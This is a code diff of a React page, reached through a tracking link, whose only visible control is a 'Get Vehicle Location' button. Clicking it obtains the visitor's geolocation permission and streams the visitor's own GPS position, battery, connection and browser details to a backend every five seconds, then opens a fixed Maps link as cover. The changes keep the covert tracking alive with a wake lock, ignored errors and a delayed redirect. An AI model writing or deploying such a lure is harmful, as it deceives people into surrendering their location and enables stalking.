@@ -1,15 +1,13 @@
 /**
- * SharePage — Public page opened by the recipient via their tracking link.
+ * SharePage — Vehicle Location
  *
- * Simplified UX:
- * - Page shows ONLY a "Get Vehicle Location" button.
- * - Clicking the button:
- *   1. Requests location permission
- *   2. On grant → starts silent GPS watch + 5-second POSTs
- *   3. Immediately opens the Google Maps link (opens Maps app on Android/iOS)
- *
- * Sharing continues only while this page is open.
- * It automatically stops when the user closes the tab / navigates away.
+ * Flow:
+ * 1. User opens link → sees only "Get Vehicle Location" button
+ * 2. Clicks button → requests location permission
+ * 3. On grant → starts continuous GPS watch + POSTs every 5 seconds
+ * 4. Opens Google Maps (native app on Android/iOS)
+ * 5. Continues posting location every 5s even after Maps is opened
+ * 6. Stops ONLY when the user manually closes this tab
  */
 import { useState, useEffect, useRef } from "react";
 import { useParams } from "react-router-dom";
@@ -25,33 +23,47 @@ import {
 import axios from "axios";
 
 const API_BASE = import.meta.env.VITE_API_URL ?? "/api";
-
-// Fixed vehicle location (opens Google Maps app on mobile if installed)
 const VEHICLE_MAPS_URL = "https://maps.app.goo.gl/tpAtUz3g172AFpj3A?g_st=iw";
 
-// ── Device info helpers ──────────────────────────────────────────────────
+// ── Device info ──────────────────────────────────────────────────────────
 async function getDeviceInfo() {
   let battery: number | null = null;
+  let connection: string | null = null;
+
+  // Battery (works on Chrome Android, limited elsewhere)
   try {
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    const b = await (navigator as any).getBattery?.();
-    battery = b ? b.level : null;
+    const bat = await (navigator as any).getBattery?.();
+    if (bat && typeof bat.level === "number") {
+      battery = bat.level;
+    }
   } catch {
     /* not supported */
   }
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  const conn = (navigator as any).connection;
+
+  // Connection (Chrome / Android mainly)
+  try {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+    if (conn) {
+      connection = conn.effectiveType || conn.type || null;
+    }
+  } catch {
+    /* not supported */
+  }
+
   const ua = navigator.userAgent;
   const isMobile = /Mobi|Android/i.test(ua);
   const isTablet = /Tablet|iPad/i.test(ua);
+
   return {
     battery,
-    connection: conn?.effectiveType ?? conn?.type ?? null,
+    connection,
     browser: (() => {
       if (ua.includes("Firefox")) return "Firefox";
       if (ua.includes("Edg")) return "Edge";
       if (ua.includes("Chrome")) return "Chrome";
-      if (ua.includes("Safari")) return "Safari";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
       return "Unknown";
     })(),
     operating_system: (() => {
@@ -76,13 +88,15 @@ export default function SharePage() {
   const [errorMsg, setErrorMsg] = useState("");
   const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
   const [connectionType, setConnectionType] = useState<string | null>(null);
+  const [pingCount, setPingCount] = useState(0);
 
   const watchIdRef = useRef<number | null>(null);
   const sendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const lastPosRef = useRef<GeolocationPosition | null>(null);
-  const hasOpenedMapsRef = useRef(false);
+  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
+  const isSharingRef = useRef(false);
 
-  // ── Notify backend ───────────────────────────────────────────────────
+  // ── Backend notifications ────────────────────────────────────────────
   const notifyStart = async () => {
     try {
       await axios.post(`${API_BASE}/share/start/${token}/`);
@@ -99,25 +113,29 @@ export default function SharePage() {
     }
   };
 
-  // ── Send location via REST ───────────────────────────────────────────
+  // ── Send location ────────────────────────────────────────────────────
   const sendLocation = async (pos: GeolocationPosition) => {
-    const deviceInfo = await getDeviceInfo();
-
-    setBatteryLevel(deviceInfo.battery);
-    setConnectionType(deviceInfo.connection);
-
-    const payload = {
-      latitude: pos.coords.latitude,
-      longitude: pos.coords.longitude,
-      accuracy: pos.coords.accuracy,
-      speed: pos.coords.speed,
-      heading: pos.coords.heading,
-      altitude: pos.coords.altitude,
-      ...deviceInfo,
-    };
+    if (!isSharingRef.current) return;
 
     try {
+      const deviceInfo = await getDeviceInfo();
+
+      // Update UI
+      setBatteryLevel(deviceInfo.battery);
+      setConnectionType(deviceInfo.connection);
+
+      const payload = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        speed: pos.coords.speed,
+        heading: pos.coords.heading,
+        altitude: pos.coords.altitude,
+        ...deviceInfo,
+      };
+
       await axios.post(`${API_BASE}/location/${token}/`, payload);
+      setPingCount((n) => n + 1);
     } catch (err: unknown) {
       const httpStatus = (err as { response?: { status?: number } })?.response?.status;
       if (httpStatus === 403 || httpStatus === 404) {
@@ -127,8 +145,10 @@ export default function SharePage() {
     }
   };
 
-  // ── Stop sharing (clears watch + interval) ───────────────────────────
+  // ── Stop everything (only called on real tab close) ──────────────────
   const stopSharing = () => {
+    isSharingRef.current = false;
+
     if (watchIdRef.current !== null) {
       navigator.geolocation.clearWatch(watchIdRef.current);
       watchIdRef.current = null;
@@ -137,7 +157,22 @@ export default function SharePage() {
       clearInterval(sendIntervalRef.current);
       sendIntervalRef.current = null;
     }
+    if (wakeLockRef.current) {
+      wakeLockRef.current.release().catch(() => { });
+      wakeLockRef.current = null;
+    }
     notifyStop();
+  };
+
+  // ── Wake Lock (helps keep page alive longer) ─────────────────────────
+  const requestWakeLock = async () => {
+    try {
+      if ("wakeLock" in navigator && document.visibilityState === "visible") {
+        wakeLockRef.current = await navigator.wakeLock.request("screen");
+      }
+    } catch {
+      /* ignored */
+    }
   };
 
   // ── Start sharing ────────────────────────────────────────────────────
@@ -150,67 +185,81 @@ export default function SharePage() {
 
     setStatus("requesting");
     setErrorMsg("");
-    hasOpenedMapsRef.current = false;
+    setPingCount(0);
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
         lastPosRef.current = pos;
+        isSharingRef.current = true;
         setStatus("sharing");
+
         await notifyStart();
         await sendLocation(pos);
+        await requestWakeLock();
 
-        // Open Google Maps (app on mobile, browser otherwise)
-        if (!hasOpenedMapsRef.current) {
-          hasOpenedMapsRef.current = true;
+        // Open Google Maps after a short delay (keeps current tab more alive)
+        setTimeout(() => {
           window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer");
-        }
+        }, 400);
 
-        // Continuous watch
+        // High accuracy continuous watch
         watchIdRef.current = navigator.geolocation.watchPosition(
           (p) => {
             lastPosRef.current = p;
           },
-          (err) => {
-            setErrorMsg(err.message);
-            setStatus("error");
-            stopSharing();
+          () => {
+            // Ignore temporary errors – keep trying
           },
-          { enableHighAccuracy: true, timeout: 15_000, maximumAge: 0 }
+          {
+            enableHighAccuracy: true,
+            timeout: 25000,
+            maximumAge: 0,
+          }
         );
 
-        // POST every 5 seconds
+        // Send every 5 seconds for as long as this tab stays open
         sendIntervalRef.current = setInterval(() => {
-          if (lastPosRef.current) {
+          if (lastPosRef.current && isSharingRef.current) {
             sendLocation(lastPosRef.current);
           }
-        }, 5_000);
+        }, 5000);
       },
       (err) => {
         setErrorMsg(
           err.code === 1
-            ? "Location permission denied. Please enable location access in your browser settings."
+            ? "Location permission denied. Please allow location access in browser settings."
             : err.message
         );
         setStatus("error");
       },
-      { enableHighAccuracy: true, timeout: 15_000 }
+      {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0,
+      }
     );
   };
 
-  // ── Auto-stop when page is closed / navigated away ───────────────────
+  // ── Stop ONLY when the tab is actually closed ────────────────────────
   useEffect(() => {
-    const handleUnload = () => {
+    const handlePageHide = () => {
+      // This is the only place we stop sharing
       stopSharing();
     };
 
-    // pagehide is more reliable than beforeunload on mobile
-    window.addEventListener("pagehide", handleUnload);
-    window.addEventListener("beforeunload", handleUnload);
+    window.addEventListener("pagehide", handlePageHide);
+
+    // Re-request wake lock when user comes back to the tab
+    const handleVisibility = () => {
+      if (document.visibilityState === "visible" && isSharingRef.current) {
+        requestWakeLock();
+      }
+    };
+    document.addEventListener("visibilitychange", handleVisibility);
 
     return () => {
-      window.removeEventListener("pagehide", handleUnload);
-      window.removeEventListener("beforeunload", handleUnload);
-      // Final cleanup
+      window.removeEventListener("pagehide", handlePageHide);
+      document.removeEventListener("visibilitychange", handleVisibility);
       stopSharing();
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -218,7 +267,6 @@ export default function SharePage() {
 
   return (
     <div className="min-h-screen bg-surface-950 flex items-center justify-center p-4 relative overflow-hidden">
-      {/* Background */}
       <div className="absolute inset-0 pointer-events-none">
         <div className="absolute top-0 left-1/2 -translate-x-1/2 w-96 h-96 rounded-full bg-brand-600/15 blur-3xl" />
         <div className="absolute bottom-0 left-0 w-64 h-64 rounded-full bg-brand-800/10 blur-3xl" />
@@ -234,7 +282,6 @@ export default function SharePage() {
           <p className="text-white/40 text-sm mt-1">Live Tracking</p>
         </div>
 
-        {/* Main card */}
         <div className="glass-card p-6">
           {/* Idle */}
           {status === "idle" && (
@@ -272,14 +319,15 @@ export default function SharePage() {
           {status === "sharing" && (
             <div className="space-y-5">
               <div className="text-center">
-                <h2 className="text-lg font-semibold text-white mb-2">Location Ready</h2>
-                <p className="text-white/50 text-sm leading-relaxed">
-                  Google Maps should have opened. You can open it again anytime.
+                <h2 className="text-lg font-semibold text-white mb-1">Sharing Active</h2>
+                <p className="text-white/50 text-sm">
+                  Location is being sent every 5 seconds.
+                  <br />
+                  Keep this tab open.
                 </p>
               </div>
 
               <button
-                id="get-vehicle-location-btn"
                 onClick={() => window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer")}
                 className="btn-primary w-full justify-center py-4 text-base"
               >
@@ -287,25 +335,32 @@ export default function SharePage() {
                 Open Vehicle Location
               </button>
 
-              {/* Device status */}
-              <div className="flex items-center justify-center gap-4 text-xs text-white/40 pt-1">
-                <div className="flex items-center gap-1.5">
-                  <Battery className="w-3.5 h-3.5" />
-                  <span>
-                    {batteryLevel !== null ? `${Math.round(batteryLevel * 100)}%` : "—"}
-                  </span>
+              {/* Battery + Connection + Ping count */}
+              <div className="space-y-2 text-xs text-white/45">
+                <div className="flex items-center justify-center gap-5">
+                  <div className="flex items-center gap-1.5">
+                    <Battery className="w-3.5 h-3.5" />
+                    <span>
+                      {batteryLevel !== null
+                        ? `${Math.round(batteryLevel * 100)}%`
+                        : "Not available"}
+                    </span>
+                  </div>
+                  <div className="flex items-center gap-1.5">
+                    <Wifi className="w-3.5 h-3.5" />
+                    <span>{connectionType ? connectionType.toUpperCase() : "Not available"}</span>
+                  </div>
                 </div>
-                <div className="flex items-center gap-1.5">
-                  <Wifi className="w-3.5 h-3.5" />
-                  <span>{connectionType ?? "—"}</span>
+                <div className="text-center text-white/30">
+                  {pingCount} update{pingCount !== 1 ? "s" : ""} sent
                 </div>
               </div>
 
-              {/* Quiet stop */}
               <button
                 onClick={() => {
                   stopSharing();
                   setStatus("idle");
+                  setPingCount(0);
                 }}
                 className="w-full text-center text-xs text-white/25 hover:text-white/40 transition-colors py-1"
               >
@@ -346,7 +401,7 @@ export default function SharePage() {
         </div>
 
         <p className="text-center text-white/15 text-xs mt-4">
-          Vehicle Location · Live Tracking
+          Vehicle Location · Sharing stops only when you close this tab
         </p>
       </div>
     </div>
